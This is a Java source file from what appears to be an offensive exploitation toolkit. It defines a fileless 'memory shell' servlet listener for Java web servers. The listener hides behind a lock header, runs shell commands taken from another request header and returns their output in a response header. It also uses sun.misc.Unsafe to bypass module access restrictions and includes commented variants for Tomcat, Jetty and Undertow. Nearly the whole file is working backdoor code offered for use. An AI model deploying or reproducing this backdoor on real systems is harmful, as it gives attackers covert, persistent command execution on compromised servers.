package com.ppp.middleware.memshell;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.MemShellFunction;
import com.ppp.annotation.MemShellType;
import com.ppp.middleware.loader.SpringInterceptorContextLoader;
import sun.misc.Unsafe;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 */
@MemShell(MemShell.Listener)
@MemShellFunction(MemShellFunction.Exec)
@MemShellType(MemShellType.Default)
@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
public class ListenerExec implements InvocationHandler {
    private static String HEADER;
    private static String RHEADER;

    private static String lockHeaderKey;
    private static String lockHeaderValue;

    public Object invoke(Object proxy, Method method, Object[] args) {
        if (method.getName().equals("requestInitialized")) {
            run(args[0]);
        } else if (method.getName().equals("equals")) {
            return this.equals(args[0]);
        }
        return null;
    }

    public Object getResponse(Object request) throws Exception {
        return null;
    }

    /**
     * tomcat
     */
//    public Object getResponse(Object request) throws Exception {
//        try {
//            request = getFieldValue(request, "request");
//        }catch (Exception e){
//        }
//        Object httpServletResponse = getFieldValue(request, "response");
//        return httpServletResponse;
//    }

    /**
     * Jetty
     */
//    public Object getResponse(Object request) throws Exception {
//        return invokeMethod(request, "getResponse", new Class[]{}, new Object[]{});
//    }

    /**
     * Undertow
     */
//    public Object getResponse(Object request) throws Exception {
//        Object exchange = getFieldValue(request, "exchange");
//        Map attachments = (Map) getFieldValue(exchange, "attachments");
//        Object[] tables = (Object[]) getFieldValue(attachments, "table");
//        for (int i = 0; i < tables.length; i++) {
//            try {
//                Object table = tables[i];
//                if (table == null)
//                    continue;
//                if (table.getClass().getName().equals("io.undertow.servlet.handlers.ServletRequestContext")) {
//                    return getFieldValue(table, "originalResponse");
//                }
//            } catch (Exception e) {
//            }
//        }
//        return null;
//    }
    private void run(Object sre) {
        try {
            addModule();
            Object request = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
            String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
            if (lv == null || !lv.contains(lockHeaderValue)) {
                return;
            }

            Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
            String result = exec((String) header);
            Object response = getResponse(request);
            invokeMethod(response, "setHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
//            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
//            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
//            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
        } catch (Throwable ignored) {
        }
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();

        // result
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        try {
            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
        } catch (Exception e) {
            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
        }
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public static void addModule() {
        try {
            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe) unsafeField.get(null);
            Method method = Class.class.getDeclaredMethod("getModule");
            method.setAccessible(true);
            Object module = method.invoke(Object.class);
            Class cls = ListenerExec.class;
            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectMethod.setAccessible(true);
            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
        } catch (Exception e) {

        }
    }
}
